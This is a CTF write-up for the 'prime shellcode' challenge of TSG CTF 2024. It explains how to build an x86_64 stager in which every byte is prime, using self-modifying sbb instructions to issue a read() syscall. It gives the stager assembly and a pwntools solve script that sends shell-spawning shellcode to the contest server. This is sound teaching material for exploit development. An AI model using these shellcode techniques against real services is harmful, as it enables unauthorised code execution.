---
title: "prime shellcode - TSG CTF 2024"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["pwn", "shellcoding", "shellcode", "prime", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "\\------------------------------------------------------------------------------------------"
source:
  name: "CTFtime writeup #39723"
  url: "https://ctftime.org/writeup/39723"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "prime shellcode"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** prime shellcode
- **Author team:** blue-lotus
- **CTFtime tags:** shellcoding
- **CTFtime:** <https://ctftime.org/writeup/39723>

---
# WARNING: LLM Polished Writeup, stop reading immediately if you are allergy to text with LLM-vibe.

\------------------------------------------------------------------------------------------

This CTF challenge presents a unique restriction: we must craft a Linux x86_64 shellcode where every byte's numeric value is a prime number (2, 3, 5, 7, 11, etc.). The challenge allocates a memory page with read, write, and execute (RWX) permissions for our shellcode.

**General Approach: The Stager Technique**

The standard method to tackle such constrained shellcode challenges is to use a two-stage approach:

1\. **Stager:** A small, initial shellcode that conforms to the byte-value restrictions. Its primary task is to read a larger, unrestricted second-stage shellcode into memory.  
2\. **Second Stage:** The actual payload that performs the desired action (e.g., spawning a shell), read in by the stager.

Our focus here is on constructing the stager, which must perform a `read()` syscall within the prime number constraint.

**Leveraging Stack Pointers and `sbb`**

The provided challenge code has a few interesting characteristics that we can exploit:

* The shellcode prologue does not clear the `rsp` register. There will be two pointers to the RWX memory page on the stack when our shellcode executes.  
* The prologue helpfully zeroes out all other general-purpose registers (except `rsp`).

We can use `pop` instructions to retrieve these pointers. Fortunately, the opcode for `pop rcx` (0x59) is a prime number. This allows us to get the address of our shellcode into the `rcx` register.

Next, we need a way to modify the shellcode itself to build the `read()` syscall. After some investigation, we find that the instruction `sbb dword ptr [rcx+imm8], imm8` has the encoding `83 59 X Y`, where `X` is the prime-numbered offset and `Y` is a prime number to subtract. Both `0x83` and `0x59` are prime, making this instruction suitable.

**Goldbach's Conjecture and Prime Offsets**

The `sbb` instruction allows us to subtract a prime number from a DWORD (4 bytes) at a prime number offset within our shellcode. Because Goldbach's conjecture states that every even integer greater than 2 can be expressed as the sum of two primes. We can represent any value that is the sum of two primes, allowing us to write any byte to the stager at the prime number offset. This also means we can't change consecutive bytes, as we need to target prime number offsets. Our choice of instruction will therefore have to be single byte instructions only or multiple-bytes instructions with only one non-prime number in it.

**Constructing the `read()` Syscall**

To construct the `read()` syscall, we need to set the following registers:

* `rax`: 0 (syscall number for `read`) - No action needed, as `rax` is already zeroed.  
* `rdi`: 0 (file descriptor for `stdin`) - No action needed, as `rdi` is already zeroed.  
* `rsi`: Address where the second-stage shellcode should be read. We can pop one of the stack pointers into `rsi` using a single-byte `pop` instruction.  
* `rdx`: Size of data to read. We can reuse one of the stack pointers for this, as it points to a large address value.  
* `syscall`: `0f 05` - The second byte (`0x05`) is prime, so we only need to modify the first byte.

**Stager Code:**

Here's the assembly code for our stager:

```assembly  
/* padding */  
int1  
int1  
int1

pop rcx  
pop rcx  
pop rcx  
sbb dword ptr [rcx+23], 7 ; Modify byte at offset 23 to 0x5a + 7 (pop rdx)  
sbb dword ptr [rcx+29], 7 ; Modify byte at offset 29 to 0x5e + 7 (pop rsi)  
sbb dword ptr [rcx+31], 2 ; Modify byte at offset 31 to 0x0F + 2 (syscall)

pop rcx  
pop rcx

.org 23, 0x65  
/* pop rdx */  
.byte 0x5a + 7

.org 29, 0x65  
/* pop rsi */  
.byte 0x5e + 7

.org 31, 0x65  
/* syscall */  
.byte 0x0F + 2, 0x05  
```

**Explanation:**

1\. We use three `pop rcx` to reduce the stack, placing the address of our shellcode into `rcx`.  
2\. We use `sbb` to modify bytes at prime offsets 23, 29, and 31. The values are chosen to create the instructions `pop rdx`, `pop rsi`, and the first byte of `syscall`.  
3\. We then execute `pop rdx` to load a large size into `rdx`.  
4\. We execute `pop rsi` to load the destination address for the second stage into `rsi`.  
5\. Finally, we execute `syscall` to perform the `read()`.

**Solution Script:**

```python  
from pwn import remote, process, context, gdb, args, asm, read, shellcraft  
import sympy  
import time

context.arch = "amd64"

sc = asm(read("sc.asm").decode())  
payload = sc.ljust(0x1000, b"\xf1")

for i in range(0x1000):  
if not sympy.isprime(payload[i]):  
print(f"Invalid shellcode at {i}: {payload[i]:#x}")  
exit(1)

# r = process("prime_shellcode/prime_shellcode")  
r = remote("34.146.186.1", 42333)  
# gdb.attach(r, "brva 0x14b9")  
r.sendafter(b"input:\n", payload)  
time.sleep(1)  
r.send(b"\x90" * len(sc) + asm([shellcraft.sh](http://shellcraft.sh)())) # Send NOP sled and shellcode  
r.interactive()  
```
